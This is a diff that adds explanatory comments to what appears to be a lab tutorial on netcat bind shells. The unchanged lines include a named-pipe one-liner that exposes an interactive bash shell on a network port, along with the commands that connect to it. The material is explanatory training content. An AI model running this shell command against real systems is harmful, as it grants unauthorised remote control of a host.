@@ -40,6 +40,7 @@ This first example is **not a shell** — just a text pipe between two machines.
 ```bash
 nc -lvnp 7777
 ```
+> Starts a netcat listener on port 7777. Nothing is connected yet — the target is just waiting for an incoming connection.
 
 | Flag | Meaning |
 |------|---------|
@@ -53,6 +54,7 @@ nc -lvnp 7777
 ```bash
 nc -nv 10.129.41.200 7777
 ```
+> Connects to the target's listener. `-n` skips DNS, `-v` shows connection status.
 
 ### 3. You can now send text back and forth:
 
@@ -77,6 +79,7 @@ To get an actual **interactive shell**, the target must pipe Bash into the Netca
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
 ```
+> Creates a named pipe (FIFO) to loop data through bash and back out over the network. Your commands come in through netcat, flow into bash, and bash output flows back to you.
 
 **Breaking this down:**
 
@@ -100,6 +103,7 @@ Your commands → nc (network) → /tmp/f (pipe) → bash → nc (network) → Y
 ```bash
 nc -nv 10.129.41.200 7777
 ```
+> Connects to the bind shell. Once connected, every line you type is sent to bash on the target and the output comes back to your terminal.
 
 ```
 Target@server:~$    ← You now have an interactive shell on the target
